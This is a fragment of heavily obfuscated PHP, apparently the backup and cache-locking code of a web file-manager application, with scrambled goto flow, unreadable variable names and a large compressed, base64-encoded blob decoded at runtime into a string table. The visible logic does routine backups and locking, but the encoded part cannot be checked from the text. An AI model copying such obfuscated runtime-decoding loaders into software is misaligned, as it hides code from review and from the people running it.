backupKeep($d¯Õ—¿ƒÄÇ) { goto f›É…ŞõòÊ; f›É…ŞõòÊ: $cÀ‚¡Îƒ° =& $_SERVER[µ…]; $CêÉâˆ§èİ = Model($cÀ‚¡Îƒ°[703])->listData(); if (empty($CêÉâˆ§èİ)) { return; } goto A•ÊÇ¢ª°; aŠ•×ÀÏƒº: for ($A«‚ÁÏéÛ = 0; $A«‚ÁÏéÛ < 12; $A«‚ÁÏéÛ++) { $C…‚öª¢Ë’[] = date($cÀ‚¡Îƒ°[720], strtotime("\55{$A«‚ÁÏéÛ}\x20\x6d\x6f\156\164\x68\x73")); } $C…‚öª¢Ë’ = array_unique($C…‚öª¢Ë’); foreach ($CêÉâˆ§èİ as $Fè÷æÉêéÇ) { if (!empty($Fè÷æÉêéÇ[$cÀ‚¡Îƒ°[28]]) && in_array($Fè÷æÉêéÇ[$cÀ‚¡Îƒ°[28]], $C…‚öª¢Ë’)) { continue; } Model($cÀ‚¡Îƒ°[703])->remove($Fè÷æÉêéÇ[$cÀ‚¡Îƒ°[388]]); $bæÌò³ƒ¬ = "\x7b\151\157\72{$d¯Õ—¿ƒÄÇ[$cÀ‚¡Îƒ°[706]]}\175\57\144\x61\164\x61\x62\141\163\145\57\142\141\143\x6b\x75\160\x5f{$Fè÷æÉêéÇ[$cÀ‚¡Îƒ°[28]]}"; IO::remove($bæÌò³ƒ¬, !1); } goto CğÇ³Ÿæ²ã; A•ÊÇ¢ª°: $A«‚ÁÏéÛ = 0; $C…‚öª¢Ë’ = array(); foreach ($CêÉâˆ§èİ as $Fè÷æÉêéÇ) { if ($A«‚ÁÏéÛ >= 7) { break; } $C…‚öª¢Ë’[] = $Fè÷æÉêéÇ[$cÀ‚¡Îƒ°[28]]; $A«‚ÁÏéÛ++; } goto aŠ•×ÀÏƒº; CğÇ³Ÿæ²ã: } public function db() { goto e×¬Ø‰‹‰; Dµ¤ª¡ó‹: return !0; goto E…£ÙÊèŞù; a‡Ê±Êò­°: $F–©è†Ù¢± = new BackupDb(); if (!$F–©è†Ù¢±->index()) { return !1; } self::set(array($f¼ÎùèÔ¬[721] => 1)); goto Dµ¤ª¡ó‹; e×¬Ø‰‹‰: $f¼ÎùèÔ¬ =& $_SERVER[µ…]; $bÀÍ»„²‡Ã = self::get(); if ($bÀÍ»„²‡Ã[$f¼ÎùèÔ¬[289]][$f¼ÎùèÔ¬[709]][$f¼ÎùèÔ¬[704]] == $f¼ÎùèÔ¬[86]) { return !0; } goto a‡Ê±Êò­°; E…£ÙÊèŞù: } public function dbFile() { goto F„º¹†¡Ù•; BÚÉ¶ë—ìÌ: $f¼™íøÚ¨Ê = new BackupDbFile(); if (!$f¼™íøÚ¨Ê->index()) { return !1; } self::set(array($BÄÚ„Ş¹Úç[722] => 1)); goto fœÒè…Ç©; fœÒè…Ç©: return !0; goto B–åÓø¿¤; F„º¹†¡Ù•: $BÄÚ„Ş¹Úç =& $_SERVER[µ…]; $eĞÊ±™»Á = self::get(); if ($eĞÊ±™»Á[$BÄÚ„Ş¹Úç[289]][$BÄÚ„Ş¹Úç[712]][$BÄÚ„Ş¹Úç[704]] == $BÄÚ„Ş¹Úç[86]) { return !0; } goto BÚÉ¶ë—ìÌ; B–åÓø¿¤: } public function file() { $eÑÉìŸ‹õ =& $_SERVER[µ…]; $F„›‚‹¼Ÿ„ = self::get(); if ($F„›‚‹¼Ÿ„[$eÑÉìŸ‹õ[289]][$eÑÉìŸ‹õ[191]][$eÑÉìŸ‹õ[704]] == $eÑÉìŸ‹õ[86]) { return !0; } if (!isset($F„›‚‹¼Ÿ„[$eÑÉìŸ‹õ[707]]) || $F„›‚‹¼Ÿ„[$eÑÉìŸ‹õ[707]] == $eÑÉìŸ‹õ[491]) { $f’ÛŠîÊÇ¨ = new BackupFile(); if (!$f’ÛŠîÊÇ¨->index()) { return !1; } } self::set(array($eÑÉìŸ‹õ[723] => 1, $eÑÉìŸ‹õ[704] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto eÎç…¤àã; dååÔË§ğç: foreach ($e¸ŞÚÈ†Å÷ as $Dº§¨–œ) { $fä›éô = $Dõ‹«ÔÀÜ« . $Dº§¨–œ . $a¦ŒÊƒ‡†¨[732]; $Eøã”Š×ìÊ = null; if ($Dº§¨–œ == $a¦ŒÊƒ‡†¨[733] && (!isset($f±ğ‡òÖ[$a¦ŒÊƒ‡†¨[707]]) || $f±ğ‡òÖ[$a¦ŒÊƒ‡†¨[707]] == $a¦ŒÊƒ‡†¨[491])) { $Eøã”Š×ìÊ = self::$io; } $E§†ø¤¿óë += $B¯»Î…õ·Œ->sqlFromDb($Dº§¨–œ, $fä›éô, $Aİ…ØÀÖÀù, $Eøã”Š×ìÊ); } if (isset($Aİ…ØÀÖÀù->task[$a¦ŒÊƒ‡†¨[734]])) { $AèÛ†¶à¨í = $Aİ…ØÀÖÀù->task[$a¦ŒÊƒ‡†¨[734]] ? $Aİ…ØÀÖÀù->task[$a¦ŒÊƒ‡†¨[734]] : timeFloat(); $BÂÔºà›¿ä = $AèÛ†¶à¨í - $Aİ…ØÀÖÀù->task[$a¦ŒÊƒ‡†¨[735]]; if ($BÂÔºà›¿ä >= 0.2) { $cò–ÌšäĞ += 1; } } $Aİ…ØÀÖÀù->end(); goto e‡èĞä”Ü¥; Bš÷ïô‹•ğ: return !0; goto a…²¬Œ‚Ú; eÛŞİêà : mk_dir($Dõ‹«ÔÀÜ«); $cò–ÌšäĞ = $E§†ø¤¿óë = 0; try { $e¸ŞÚÈ†Å÷ = $B¯»Î…õ·Œ->db()->getTables(); } catch (Exception $D­÷œöİ¾„) { return !1; } goto C½ ¢œ—ÃÏ; e‡èĞä”Ü¥: $cà’Ç¾áƒ¨ = array($a¦ŒÊƒ‡†¨[736] => $d’‚œŞĞØ, $a¦ŒÊƒ‡†¨[721] => 1, $a¦ŒÊƒ‡†¨[737] => $cò–ÌšäĞ, $a¦ŒÊƒ‡†¨[738] => $E§†ø¤¿óë); Backup::set($cà’Ç¾áƒ¨); if ($cò–ÌšäĞ > $E§†ø¤¿óë) { return !1; } goto Bš÷ïô‹•ğ; fó°òÜ¬ƒÜ: self::$name = $f±ğ‡òÖ[$a¦ŒÊƒ‡†¨[28]]; $Dì”öß† = $GLOBALS[$a¦ŒÊƒ‡†¨[6]][$a¦ŒÊƒ‡†¨[17]]; $d’‚œŞĞØ = $this->_dbType($Dì”öß†); goto eô£ù¿Ï³; eô£ù¿Ï³: $B¯»Î…õ·Œ = new DbManage($Dì”öß†, $d’‚œŞĞØ); $Dõ‹«ÔÀÜ« = TEMP_FILES . $a¦ŒÊƒ‡†¨[724] . self::$name . $a¦ŒÊƒ‡†¨[8]; del_dir($Dõ‹«ÔÀÜ«); goto eÛŞİêà ; eÎç…¤àã: $a¦ŒÊƒ‡†¨ =& $_SERVER[µ…]; $f±ğ‡òÖ = Backup::get(); self::$io = $f±ğ‡òÖ[$a¦ŒÊƒ‡†¨[706]]; goto fó°òÜ¬ƒÜ; C½ ¢œ—ÃÏ: $e¸ŞÚÈ†Å÷ = array_diff($e¸ŞÚÈ†Å÷, array($a¦ŒÊƒ‡†¨[725], $a¦ŒÊƒ‡†¨[726])); foreach ($e¸ŞÚÈ†Å÷ as $Dº§¨–œ) { $cò–ÌšäĞ += $B¯»Î…õ·Œ->model($Dº§¨–œ)->count(); } $Aİ…ØÀÖÀù = new Task($a¦ŒÊƒ‡†¨[727], $a¦ŒÊƒ‡†¨[728], $cò–ÌšäĞ, LNG($a¦ŒÊƒ‡†¨[729]) . $a¦ŒÊƒ‡†¨[730] . LNG($a¦ŒÊƒ‡†¨[731])); goto dååÔË§ğç; a…²¬Œ‚Ú: } private function _dbType($Aƒ÷åöŠšÉ) { goto DÑÄõÌŠÁœ; DÑÄõÌŠÁœ: $fòå¢•Ã¢ =& $_SERVER[µ…]; $Aƒ÷åöŠšÉ = array_change_key_case($Aƒ÷åöŠšÉ); $Eƒİö‘–ÏÒ = $Aƒ÷åöŠšÉ[$fòå¢•Ã¢[739]]; goto a àÜˆ¶¸; a àÜˆ¶¸: if ($Eƒİö‘–ÏÒ == $fòå¢•Ã¢[740]) { $Eìò©Ä«£¯ = explode($fòå¢•Ã¢[4], $Aƒ÷åöŠšÉ[$fòå¢•Ã¢[741]]); $Eƒİö‘–ÏÒ = $Eìò©Ä«£¯[0]; } $fÄ£®Ï´ˆ… = array($fòå¢•Ã¢[742] => $fòå¢•Ã¢[9], $fòå¢•Ã¢[743] => $fòå¢•Ã¢[744]); if (isset($fÄ£®Ï´ˆ…[$Eƒİö‘–ÏÒ])) { $Eƒİö‘–ÏÒ = $fÄ£®Ï´ˆ…[$Eƒİö‘–ÏÒ]; } goto c‚Õ÷¼‰Ç‹; c‚Õ÷¼‰Ç‹: return $Eƒİö‘–ÏÒ; goto bˆĞ”„·; bˆĞ”„·: } } class BackupDbFile { public function __construct() { } public function index() { goto dœÛ±‚â; EÑÍ‚Ä¾: $F‹ÁˆŠ‡ó->task[$E‘´‰ºÄæÒ[713]] = $D•½ÆÜèÎ“; foreach ($c…ˆ†åº¹ê[$E‘´‰ºÄæÒ[73]] as $eÇñÇ—„Íß) { $DÉ×ÌÒ·¢Ñ = IO::move($eÇñÇ—„Íß[$E‘´‰ºÄæÒ[75]], $CŸ¤÷ŠØÖô); if (!$DÉ×ÌÒ·¢Ñ) { $F‹ÁˆŠ‡ó->end(); $CİÂÂÖëá£ = IO::getLastError($E‘´‰ºÄæÒ[748] . $eÇñÇ—„Íß[$E‘´‰ºÄæÒ[75]] . $E‘´‰ºÄæÒ[749] . $CŸ¤÷ŠØÖô . $E‘´‰ºÄæÒ[499]); write_log($CİÂÂÖëá£, $E‘´‰ºÄæÒ[728]); return !1; } } $f÷–«‰œ“˜ = CONTROLLER_DIR . $E‘´‰ºÄæÒ[750]; goto CšéÅï–—Ë; CšéÅï–—Ë: $f´µôŸÛ‰ = CONTROLLER_DIR . $E‘´‰ºÄæÒ[751]; IO::copy($f÷–«‰œ“˜, $CŸ¤÷ŠØÖô); IO::copy($f´µôŸÛ‰, $CŸ¤÷ŠØÖô); goto f”¯¿¶‰ÒÂ; E…éô¶¢£¯: $c…ˆ†åº¹ê = IO::listPath($a¶ÓÚÓõ¸ƒ); $a‹Ë”¡‡´Ÿ = isset($c…ˆ†åº¹ê[$E‘´‰ºÄæÒ[73]]) ? $c…ˆ†åº¹ê[$E‘´‰ºÄæÒ[73]] : array(); $D•½ÆÜèÎ“ = array_sum(array_column($a‹Ë”¡‡´Ÿ, $E‘´‰ºÄæÒ[77])); goto BŸÁöİèÅ; dœÛ±‚â: $E‘´‰ºÄæÒ =& $_SERVER[µ…]; $e¨Üßë„Ç = Backup::get(); $C¬ÊìÔ„±¬ = $e¨Üßë„Ç[$E‘´‰ºÄæÒ[28]]; goto BÊãòÌ«¯˜; BÊãòÌ«¯˜: $a¶ÓÚÓõ¸ƒ = TEMP_FILES . "\142\x61\x63\153\x75\160\137{$C¬ÊìÔ„±¬}\x2f"; $CŸ¤÷ŠØÖô = "\x7b\151\157\72{$e¨Üßë„Ç[$E‘´‰ºÄæÒ[706]]}\x7d\57\144\x61\164\141\x62\141\163\x65\57\x62\141\x63\153\165\160\137{$C¬ÊìÔ„±¬}\57"; if (!($CŸ¤÷ŠØÖô = IO::mkdir($CŸ¤÷ŠØÖô))) { return !1; } goto E…éô¶¢£¯; f”¯¿¶‰ÒÂ: $F‹ÁˆŠ‡ó->end(); Backup::set(array($E‘´‰ºÄæÒ[752] => $D•½ÆÜèÎ“)); return !0; goto B“¦ä¸„©÷; BŸÁöİèÅ: if (!$D•½ÆÜèÎ“) { return !1; } Backup::set(array($E‘´‰ºÄæÒ[745] => $D•½ÆÜèÎ“)); $F‹ÁˆŠ‡ó = new TaskFileTransfer($E‘´‰ºÄæÒ[746], $E‘´‰ºÄæÒ[728], count($a‹Ë”¡‡´Ÿ), LNG($E‘´‰ºÄæÒ[729]) . $E‘´‰ºÄæÒ[434] . LNG($E‘´‰ºÄæÒ[731]) . $E‘´‰ºÄæÒ[747]); goto EÑÍ‚Ä¾; B“¦ä¸„©÷: } } goto eçÂŞãöäÑ; cÖÁ„®ßÂ: class CacheLockRedis { public function lock($c¬Ö˜Üê‹—, $B£ƒ×¡Áí = 10) { $A´Å‚ÂĞ÷ = Cache::init(); $dÂó¦ë¡ƒ = microtime(!0) + $B£ƒ×¡Áí; while (microtime(!0) < $dÂó¦ë¡ƒ) { $b†Ğˆ™Ş¾¸ = $A´Å‚ÂĞ÷->get($c¬Ö˜Üê‹—); if (!$b†Ğˆ™Ş¾¸) { $F…‡¡¿×İŸ = $A´Å‚ÂĞ÷->setLock($c¬Ö˜Üê‹—, $dÂó¦ë¡ƒ, $B£ƒ×¡Áí); if ($F…‡¡¿×İŸ) { return !0; } } else { if ($b†Ğˆ™Ş¾¸ < microtime(!0)) { $A´Å‚ÂĞ÷->set($c¬Ö˜Üê‹—, $dÂó¦ë¡ƒ, $B£ƒ×¡Áí * 2); if ($A´Å‚ÂĞ÷->get($c¬Ö˜Üê‹—) === $b†Ğˆ™Ş¾¸) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($FÙğÕĞø) { return Cache::init()->get($FÙğÕĞø); } public function unlock($Aæ³ñÇ) { return Cache::init()->remove($Aæ³ñÇ); } } class CacheLockMemcached { public function lock($bçªÄŠÑ¥», $E¼ùôèÄù = 0) { $a…‹ÃäÌ•¤ = Cache::init(); $c¯‰Áİƒš… = microtime(!0) + $E¼ùôèÄù; while (microtime(!0) < $c¯‰Áİƒš…) { $AËÍŒ‹Ô°µ = $a…‹ÃäÌ•¤->get($bçªÄŠÑ¥»); if (!$AËÍŒ‹Ô°µ || $AËÍŒ‹Ô°µ < microtime(!0)) { $a”™º®¤ĞÁ = $a…‹ÃäÌ•¤->handle->add($bçªÄŠÑ¥», $c¯‰Áİƒš…, $E¼ùôèÄù); if ($a”™º®¤ĞÁ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($ešŞ´…ƒ›®) { return Cache::init()->get($ešŞ´…ƒ›®); } public function unlock($f—´ÕÙÂŸ) { return Cache::init()->remove($f—´ÕÙÂŸ); } } class CacheLockDatabase { public function lock($cØÃÈÙæ˜, $AÁÆ¹ì…ø = 0) { $c­©Òã±” = Model($_SERVER[µ…][773]); $dÚ»¾§©÷™ = microtime(!0) + $AÁÆ¹ì…ø; while (microtime(!0) < $dÚ»¾§©÷™) { $C­”ğçÂÚ¸ = $c­©Òã±”->get($cØÃÈÙæ˜); if (!$C­”ğçÂÚ¸ || $C­”ğçÂÚ¸ < microtime(!0)) { $A¼›¶Ò†ˆ¨ = $c­©Òã±”->set($cØÃÈÙæ˜, $dÚ»¾§©÷™); if ($A¼›¶Ò†ˆ¨) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Bè†Æµ•Í) { return Model($_SERVER[µ…][773])->get($Bè†Æµ•Í); } public function unlock($E›‹ŞÂµ¢) { Model($_SERVER[µ…][773])->remove($E›‹ŞÂµ¢); } } goto AØİëğæß; eö°©ç›‡: if (!function_exists('_kodDe')) { function _kodDe($aƒæÚ›¾”à) { $aƒæÚ›¾”à = base64_decode($aƒæÚ›¾”à); $B›Ñ‚‘Šİ‹ = strlen($aƒæÚ›¾”à); $AÓß¢¾®”é = ''; $c­Ìé¸Ïâó = ord($aƒæÚ›¾”à[0]) - 30; for ($bºÆ¿ß¤‚‘ = 1; $bºÆ¿ß¤‚‘ < $B›Ñ‚‘Šİ‹; $bºÆ¿ß¤‚‘ += 2) { if ($bºÆ¿ß¤‚‘ + 1 < $B›Ñ‚‘Šİ‹) { $AÓß¢¾®”é .= chr(ord($aƒæÚ›¾”à[$bºÆ¿ß¤‚‘ + 1]) + $c­Ìé¸Ïâó); $AÓß¢¾®”é .= chr(ord($aƒæÚ›¾”à[$bºÆ¿ß¤‚‘]) + $c­Ìé¸Ïâó); } else { $AÓß¢¾®”é .= chr(ord($aƒæÚ›¾”à[$bºÆ¿ß¤‚‘]) + $c­Ìé¸Ïâó); } } return $AÓß¢¾®”é; } } define("\xb5\x85", strrev('¦')); $_SERVER[µ…] = explode("\174\2\174\3\174\1", gzinflate(substr(strrev('’G-‘+l¶Èã±ËœNÃ¥ğçšUËJ‘Ê9xÕÅ|	}­'."\0".''."\0".''."\0".''."\0".''."\0".''."\0".'‹').strrev('	w‘ÊR„*å¸wüá'."\0".'´%'."\n".'PÏ¸B#ã”$¯•İåi-­%i+(;ã')."\x47\x4a\xfa\xcd\x3d\xb3\x2b\x99\x7e\xdf\xef\xff\xe7\x17\xac\x9d\x37\xf7\xcc\x9b\x37\xef\xcd\xbc\xf7\xe6\x85\xaf\x36\x9f\xb1\x72\xff\x95\x7\xac\xdc\xef\x8c\xc7\x3f\xc0\x1f\xe0\xef".base64_decode('/ugv+D5xzSE/Qf8dsOacsrK2meMqOw47/65b5P0bn/z28bue/f3L/3h2Yzg+')."\xef\xbe\xdf\x27\x4f\xf8\xc9\xa3\x6d\xd2\xe5\xb5\x20\x29\xce\x59\x8b\x7f\xa4\xac\x66\x4a\xca\xb0\x6a\x98\x6\x6\xc4\xb4\x6c\x42\x4d\xe2\x6f\x35\x8b\x7f\xdd\xf8\xc7\x18\x48\xab\xa6"."\202\277\43\35\201\160\44\324\325\331\351\15\206\43\244\104\61\76\243\305\311\127\116\326\345\14\51\74\247\350\6\250\112\54\56\222\323\162\112\326\2\341\200\270\154".base64_decode('ylHZICU1N0aavZ3+wNJIeGmnl6SIRgbyij6CQ+gzZMq6GVYzCksxpLN2NXpb').base64_decode('fR1SOOjpCHmawr5ABwY3BdrbfeFCeDDg9zd6mhYWxnQGPa3tHgm0L61E1GxC')."\x2b\x93\x96\xe3\x98\xe5\x52\x39\xfe\x68\x51\x95\x74\x1c\x7f\x66\x65\xda\x1c\x73\x24\x47\xbe\xc2\xec\xb\xcc\x41\x36\x9f\x4e\xe3\x40\x7\xfb\x22\xed\x57\x12\x72\x3e\x4d\xc6\xac\x59".base64_decode('DOR0NSPTri9URhgUf8h5U1OzMRzwDpu6zOGgxTFdyShZUlTI6/c2hSXYTKkl')."\x18\x68\x97\xc8\x54\x64\x64\xc3\x54\x74\xa9\xbb\xcd\x1b\xf4\x4a\xb0\xe9\xf5\xa5\xa8\xc7\xa5\x12\xce\xd7\xd5\x1\x6\x44\xf2\xf8\xfd\xd2\x58\x25\x98\x4a\x26\x47\x8b\xc1\x79\x8a\x14"."\26\10\66\173\203\122\343\122\211\217\123\114\313\144\264\254\13\224\2\346\323\24\232\352\15\6\361\207\203\140\260\337\7\247\216\4\2\55\55\41\57\13\221\316\55"."\xf2\x83\x96\x4c\x27\x58\x6a\x9\xc5\x13\x69\x33\x32\x28\xa7\xf3\x14\x59\xfb\xf1\x6f\x29\xf9\x21\xbf\x9a\x41\x10\x78\x40\xcd\xaa\x79\x82\xac\xa4\x8\x4d\x63\x2b\x87\x7c\xe4\x69\x6a"."\x85\x42\x32\x20\x9b\x46\xd6\x14\x58\x60\x83\xf8\xb3\x7e\x1e\xfe\x9d\x4b\x12\x45\x23\x30\x4e\xd1\xcd\x88\x92\x8d\x69\x71\x35\x4b\x96\x61\x3\x59\x72\x4\xf1\x64\x33\xd5\xac\xab\x20"."\35\51\120\163\305\264\334\110\273\66\110\372\220\120\323\212\237\255\262\204\226\216\53\72\17\347\100\166\61\206\164\106\35\25\162\167\344\63\142\22\26\214\245\324\164".base64_decode('XKeL88dSguWvJkb4IjS0vB5TfGCZ8LydrCXVJJFimqDTBu1XVy6tyfGQogt9')."\x6d\x1\x19\x3\x79\x53\x4\xe6\x51\xb2\x16\x4d\xcf\x34\x3\x72\x41\xea\x7\x8b\x44\xed\x2a\x12\xd1\x4f\x97\x49\x5c\x18\x42\x17\x21\x73\x65\x3d\xa7\x39\xf7\x2d\xeb\x99\xf\xfe\x94".base64_decode('E5rXS5qWUtLpiDKskOWUic8waF/dRlTNugEEB32BSEo2Uu3xGRGUi5LSuDLs')."\xca\xa5\x72\x64\xc5\xb3\x45\xde\x6b\x41\x77\x38\x3b\x1d\x9a\xe9\x15\x8\x72\x5a\x8b\xc9\x69\xb1\xa7\xf8\x3b\x65\x9a\xb9\x90\x92\x8d\xc3\x1\x21\x3d\xd2\x86\xb2\x68\xc0\x72\x8a\x42"."\22\65\73\244\270\324\56\55\225\332\152\325\132\203\146\314\244\331\27\355\35\203\31\14\150\16\23\214\51\41\141\145\330\44\203\42\315\215\245\144\35\114\127\175\336"."\114\70\147\23\262\222\313\245\325\230\154\252\132\326\255\305\114\305\164\32\246\256\310\244\64\117\54\246\30\206\263\111\313\232\272\226\166\172\322\151\155\310\31\320\325"."\xa4\x9a\xad\x95\x2a\x8\x11\x6\x91\x60\x99\x3b\x21\x61\xac\x25\x6b\xb7\x64\xae\x4\x71\x5\xd2\x85\xa\x5c\x1b\x5d\x93\x2c\xb5\x2e\x67\x8d\x84\xa2\x3b\xbd\x64\xd1\xd4\x4a\x60\x3e"."\x18\x5d\xa4\xc9\x9a\x55\x23\xa7\x19\x2a\x6c\x5e\xad\x24\x9b\xa6\x1c\x4b\x41\x9a\xc2\x8b\xaf\xff\x91\xf4\x6a\x36\xad\x66\x95\x82\xb4\xde\xe1\x9c\xaa\x2b\x6\x6d\xab\xd4\xda\x1e\x26".base64_decode('hYDSFWenLiczcq2Uy0fByJDVWwSGU5OhqZViMOiQMnnDdOoKIE4q2AbJHPsS')."\316\166\270\264\124\45\356\14\1\32\116\300\323\253\152\44\200\66\22\215\303\320\266\160\270\63\342\153\1\133\165\207\67\322\356\11\67\265\221\146\233\162\222\266\331".base64_decode('DygzK5IClzjBEoOI1QH6yoGd2pCig4obR2qlfi0e1YZdNAomDgEaQhPD6c6Z')."\xce\xa0\x9c\x4d\xc2\xf1\x89\x8e\x98\xa\x41\x3f\x63\x30\x69\x1d\x68\xbf\x92\x4d\x9a\x29\x9a\x31\xe4\xd\x2e\xf6\x6\x23\xa1\x40\x4b\xb8\xdb\x13\x24\x9b\x7c\x16\x60\xc9\x30\xad\xa"."\26\235\166\6\225\70\30\372\230\111\363\311\71\70\152\64\15\134\30\160\256\150\54\134\54\64\316\357\153\205\3\323\354\64\100\42\247\230\212\226\355\127\63\52\154".strrev('™ª´ÒÕ]«¸óÊ·²ÅWfŞòŠßÁ;–Wë(ª›ßT:È4• HĞbÉ»')."\x52\x27\x60\x49\x54\x39\x2d\x91\x4e\x17\xa4\xa8\x92\x2\xb\x7f\x64\x0\xe0\x8e\x25\x2c\x6b\xdb\xd0\x61\x60\xd0\xbb\xa8\xcb\x1b\xa\x47\xda\xbd\xe1\xb6\x40\x33\xa9\xc1\xeb\x21\x5f"."\176\15\57\115\332\243\36\374\263\314\305\351\61\230\163\137\106\116\332\250\64\14\265\153\272\142\205\360\135\243\133\215\123\62\16\203\155\212\232\114\221\376\251\260\264"."\x98\x96\xd6\x74\x39\xd\xa9\x18\x45\x62\x85\x52\x96\xa4\x9a\x20\xf3\x83\x9\x26\xf\x84\xd4\x4c\x8e\xd2\x35\x33\x95\xcf\x44\x85\x4f\xca\x8d\x82\xf9\xa6\xdb\x4b\x4a\x63\xdb\x9b\xa6".strrev('-Õ57SK÷ÌŠm1,*ƒ	4Ç’H‹“)‘–¸á“ğtĞîÌ¥Ze8I7Z¯“')."\111\332\25\63\245\221\111\112\52\264\111\171\326\66\332\312\270\222\126\350\150\244\24\112\322\1\347\66\310\6\51\301\350\72\140\324\0\224\357\245\252\21\4\131\40"."\343\104\303\335\220\277\345\0\223\45\115\203\155\44\20\355\3\353\204\260\20\252\321\42\354\372\21\15\305\201\126\313\74\175\247\256\44\124\262\332\262\140\252\332\145".strrev('(¥ 	&©ò{¶N¦#šzr){è;¤1™à0M#ûòék'."\n".'÷ÃS'."\0".'fŸ½')."\334\6\60\144\160\232\260\5\361\275\212\123\161\272\307\102\52\215\277\1\131\316\151\131\103\161\306\110\151\161\116\317\161\212\271\66\142\136\220\203\163\352\303\116\71"."\x33\xea\xcc\x80\x61\x72\xb2\xa6\x5b\xb7\x56\x29\x2c\xee\xd0\x3e\x32\xa1\x9c\x6e\xc3\x81\x5\x82\x10\xdd\xd3\x3b\x3\x21\x92\xa1\x1\x42\x1\xdb\x14\x55\x74\xd2\x8e\xce\x2e\x12\x95"."\x11\x90\xa9\xd5\x4b\x80\xe3\xe8\x36\x2d\x13\xa6\xc9\xd3\x1d\xa2\x34\x37\xf\xd2\xeb\xea\xa8\xcc\xfb\xd8\x40\xdb\x43\xca\x1e\xce\xa4\x39\x27\x68\xed\x95\x93\xcf\x45\xb8\xcd\xd7\xb1".base64_decode('MNIeaPb6I74OQJDChfCuzmYPnVwR3hgIt1mgXYAkLfb4ffbk3iW+UDhUNArA').strrev('‘pÉˆkh>šÛ†_JH\'iáÓOSO&‘C›úóâØ,%¾-½uû ¶¼º')."\101\50\217\322\301\212\130\4\246\10\25\5\42\34\17\300\76\251\20\334\43\335\205\122\60\352\11\141\316\143\132\236\142\43\343\17\63\224\234\144\144\262\254\144\272"."\x7\x96\xe1\x9f\x72\xc9\x13\x92\xcc\x5c\x84\x11\x8e\xe8\x8\xfb\x44\xdd\xa0\x61\xc0\x9\x92\xfa\x25\x42\xe7\xb\x5a\x10\x81\x69\x1a\x95\x4\x23\xd9\xc5\x1\x9e\x84\xc9\xa8\x80\x2d"."\xc\xd6\x5\x8f\x3\x33\xe0\x41\xe2\x36\xc0\x4\x34\x23\x11\xba\xd6\xc\x20\xa8\x78\x68\x73\x12\x5c\xd4\x8d\x4\x3a\xbd\x41\xf\x14\x94\x23\xdd\xc1\x40\x47\x2b\xc9\x30\x94\x52\x68"."\3\174\144\370\313\50\337\104\344\145\223\223\60\300\364\310\124\166\342\203\336\247\321\241\134\211\177\246\342\37\300\357\221\312\225\54\35\365\50\44\343\214\60\120\141"."\x8\xac\x6\x4a\x82\xb5\x3c\xab\x2d\xaa\x69\x69\xba\x4e\xc1\xd6\xcf\xe8\x1\x93\xb4\xfb\xc\x8a\x24\xc3\x94\xf8\x54\xd2\xbd\x8c\x6c\x25\xe1\xc0\x42\x6f\x47\x84\x62\x16\xe\x9\xd8"."\x88\x1\x40\x76\xd\x4\xc9\x80\x98\x5a\x3f\x95\xa4\x70\x64\xd0\x1b\xa2\xab\x5c\x57\x6\xf2\x2a\x1d\x2e\xb7\xab\x92\x60\xb1\x2\x76\x2b\x52\xbd\xfb\xe4\xde\xa1\xca\xb2\x1e\x67\xa5"."\153\31\370\50\257\230\217\203\44\324\353\262\4\47\223\374\171\235\345\206\34\121\231\321\120\136\333\353\356\165\227\65\324\366\170\234\243\262\163\264\312\71\307\271\254".base64_decode('stdVXkkAy1ZMc9SsgglAwoZJy8BPfW/DlF7n1FOWz+/pXVZaWzmx1zWpd2hZ')."\105\171\3\255\47\226\327\201\224\30\33\141\115\215\127\226\201\46\1\116\211\45\311\42\222\47\44\240\21\243\152\216\103\127\314\134\105\341\140\16\225\44\317\321\343"."\xec\xad\x5c\xd6\x20\xe4\x13\x40\xf6\xba\x0\x97\x4\xe8\x6f\x8a\xa5\xf3\x38\x4f\x82\x3d\x63\x59\xe1\xba\x27\xf8\x91\xcf\xc6\x38\xf5\x84\xeb\x22\x2a\xc7\x8\x1d\x50\x93\x59\xb6\x84"."\300\366\317\244\163\53\203\276\142\12\376\135\105\47\62\251\14\123\322\220\115\250\72\301\316\174\126\35\240\147\16\131\145\200\174\150\46\305\357\250\142\16\51\24\75".base64_decode('ANwSBshBJUIQJYTSiB8kNXDJTEFiCulFLgKZsSEWiitZMk+HktRGTM4pIaGH')."\x91\x48\xd8\xd3\xe8\xf7\x46\x28\x85\x21\x94\x98\x86\x11\x55\x6c\x64\xa7\x74\xa0\x6b\x9c\xa2\x52\xfa\x10\xe3\xdc\x39\x12\x44\xc8\xca\x37\x6\xd2\x12\x22\xc\x92\xa2\xeb\x9a\x5e\x8b"."\x4e\x23\x8d\x7c\xe\x72\x71\x40\xe8\x32\xc1\xd8\x4a\x40\x62\x97\xea\xe7\x49\x78\xc8\x49\xbe\x88\x38\x1\x39\x99\x72\xe\x50\x88\x66\xdc\x80\xbb\xac\xb7\x37\xdf\xa3\xc4\x97\xf5\x0"."\xa4\x96\x9d\x89\x65\x2b\xa6\xaf\x2a\xa7\xcc\xb9\xbb\x17\xfc\x47\x3\x98\x96\x91\xd6\xe7\xf8\x5c\x1a\x80\x4b\xa3\x9c\x93\xa7\xc8\xa1\x59\x84\x51\xc3\x8\xd8\x9f\x5d\xb0\x1d\xec\x0"."\xc4\x12\x60\xd1\x38\xa8\xe9\x8c\x69\xca\x59\xf8\x6d\x53\x33\xe5\xb4\xa5\x88\x30\x84\x50\xd2\x44\x37\x6e\x72\x56\x80\x67\xdb\xcf\x29\x16\xdc\xca\x85\x33\x47\x44\x4e\x3b\xd8\x81\x1a".base64_decode('O/kQjrtgjpBiulgKhxCJ/9aXUAqfBWuoSdjf8GlNaMQwlYzlXNJQZD2Wasmn')."\323\46\143\365\323\152\77\51\226\54\220\345\305\322\266\150\172\314\202\46\174\203\154\365\0\126\44\54\225\225\22\246\274\242\124\362\165\110\215\201\200\337\353\351\220"."\xe0\x6e\x4c\x76\x11\x5f\xb3\x93\x96\xb0\xc4\xe9\x23\xe2\xf\xfb\x50\x29\xaf\x2d\x3\xa\x65\x52\x28\x39\x9e\x22\x21\xc8\x14\x3a\xe0\x49\x8c\x3\x6e\xfd\xe\xd0\x2e\x7\x14\x6d\x1c"."\x9c\x11\x77\xf0\xf3\x2d\x7\x63\x83\x1d\x84\x3b\x76\x98\xb2\xe\x36\x6e\xc8\xbe\x92\x4f\x5f\xb3\x43\x35\x9a\x11\xcf\x8f\xca\x45\x51\xb4